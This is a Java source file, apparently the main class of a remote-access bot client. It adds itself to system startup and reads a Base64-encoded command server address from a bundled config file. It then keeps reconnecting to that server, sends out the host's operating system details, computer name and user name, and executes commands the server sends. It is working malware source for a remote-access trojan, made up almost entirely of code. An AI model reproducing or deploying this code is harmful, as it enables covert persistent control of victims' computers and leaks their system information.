package bot;
import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.Socket;
import java.util.HashMap;

import com.redpois0n.common.Base64;
import com.redpois0n.common.Version;
//import com.redpois0n.oslib.OperatingSystem;
import oslib.OperatingSystem;
import commands.Commands;
import oslib.AbstractOperatingSystem;


public class Main {
	
	public static final int TIMEOUT = 5000;
	
	private static Socket socket;
	private static DataInputStream dis;
	private static DataOutputStream dos;
	
	private static String ip;
	private static int port;

	public static void main(String[] args) throws Exception {
            System.out.println("In Main 2");
            	AbstractOperatingSystem os = OperatingSystem.getOperatingSystem();
		if (os.getType() == OperatingSystem.MACOS) {
			// disable tray icon on osx
			System.getProperty("apple.awt.UIElement", "false");
		}
                if (os.getType() == OperatingSystem.WINDOWS) {
			// disable tray icon on osx
			System.getProperty("apple.awt.UIElement", "false");
		} 
		
		Mutex.hook();
		
		//adds to startup if not args contains -s
		if (!argsContains("-s", args)) {
			Startup.addToStartup(getStartupName());
		}
		
		InputStream configUrl = Main.class.getResourceAsStream("/c.dat");
		
		if (configUrl == null) {
			ip = "127.0.0.1";
			port = 1444;
		} else {
			BufferedReader reader = new BufferedReader(new InputStreamReader(configUrl));
			String line;
			HashMap<String, String> config = new HashMap<String, String>();
			
			while ((line = reader.readLine()) != null) {
				String[] kv = Base64.decode(line).split("=");
				config.put(kv[0], kv[1]);
			}
			
			reader.close();
			
			ip = config.get("ip");
			port = Integer.parseInt(config.get("port"));
		}
		
		while (true) {
			try {
				socket = new Socket(ip, port);
				
				socket.setSoTimeout(10000);
				
				dis = new DataInputStream(socket.getInputStream());
				dos = new DataOutputStream(socket.getOutputStream());
				
				writeString(os.getDetailedString());// .getShortOperatingSystem());
				writeString(os.getType() == OperatingSystem.WINDOWS ? System.getenv("COMPUTERNAME") : System.getProperty("user.name"));
				writeString(System.getProperty("user.name"));
				writeString(Version.getVersion());
				
				byte b;
				while ((b = dis.readByte()) != -1) {			
					Commands.execute(b);	
				}
				
				socket.close();
			} catch (Exception ex) {
				ex.printStackTrace();
				try { Thread.sleep(TIMEOUT); } catch (Exception ex1) { ex1.printStackTrace(); }
			}
		}
	}
	
	public static boolean argsContains(String s, String[] args) {
		for (String arg : args) {
			if (arg.equalsIgnoreCase(s)) {
				return true;
			}
		}
		
		return false;
	}
	
	/**
	 * Reads string from input stream
	 * @return
	 * @throws Exception
	 */
	public static synchronized String readString() throws Exception {
		short len = dis.readShort();
				
		StringBuilder builder = new StringBuilder();
		for (int i = 0; i < len; i++) {
			builder.append(dis.readChar());
		}
		
		return builder.toString();
	}
	
	/**
	 * Writes string to output stream
	 * @param s
	 * @throws Exception
	 */
	public static synchronized void writeString(String s) throws Exception {
		dos.writeShort(s.length());
		dos.writeChars(s);
	}
	
	public static synchronized int readInt() throws Exception {
		return dis.readInt();
	}
	
	public static void writeByte(byte b) throws Exception {
		dos.writeByte(b);
	}

	public static void disconnect() throws Exception {
		socket.close();
	}

	/**
	 * The startup file name / registry key. Can be changed to anything (No spaces recommended)
	 * @return
	 */
	public static String getStartupName() {
		return "Bot";
	}

	public static void log(String s) {
		System.out.println(s);
	}

}
